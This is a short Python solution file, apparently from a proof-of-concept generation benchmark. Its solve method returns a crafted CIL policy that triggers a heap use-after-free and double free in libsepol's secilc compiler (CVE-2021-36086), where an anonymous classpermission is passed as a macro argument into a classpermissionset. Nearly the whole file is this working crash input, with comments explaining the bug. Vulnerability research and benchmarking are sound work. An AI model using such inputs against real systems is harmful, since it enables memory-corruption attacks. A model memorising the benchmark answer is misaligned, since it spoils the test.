class Solution:
    def solve(self, src_path: str) -> bytes:
        # The vulnerability (arvo:60670 / CVE-2021-36086) involves a Heap Use After Free in libsepol's CIL compiler.
        # It is triggered when an anonymous classpermission is passed as an argument to a macro,
        # and that macro uses the argument in a classpermissionset rule.
        # This leads to a double free during AST destruction because the anonymous classpermission
        # is destroyed twice (once as the macro argument, once as part of the classpermissionset).
        
        # We construct a minimal valid CIL policy to reach the resolution and destruction phases.
        # The policy includes necessary definitions (class, sid, user, role, type, mls) to be valid
        # for a standard MLS-enabled build of secilc.
        
        poc = """(class c (p))
(classorder (c))
(sid s)
(sidorder (s))
(user u)
(role r)
(type t)
(category x)
(categoryorder (x))
(sensitivity l)
(sensitivityorder (l))
(sensitivitycategory l (x))
(allow t self (c (p)))
(roletype r t)
(userrole u r)
(userlevel u (l))
(context n (u r t ((l)(l))))
(sidcontext s n)
(macro m ((classpermission a)) (classpermissionset a (c (p))))
(call m ((c (p))))
"""
        return poc.encode('utf-8')